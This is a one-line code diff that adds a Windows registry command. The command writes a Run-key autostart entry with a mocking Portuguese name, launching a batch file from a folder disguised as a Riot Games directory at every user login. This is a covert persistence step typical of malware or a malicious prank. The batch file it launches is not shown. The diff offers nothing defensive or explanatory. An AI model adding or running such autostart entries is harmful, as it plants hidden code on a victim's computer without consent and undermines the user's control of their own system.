@@ -1,0 +1,1 @@
+REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ViniciusSeLascando /t REG_SZ /d "C:\RiotGames\executar.bat" /f
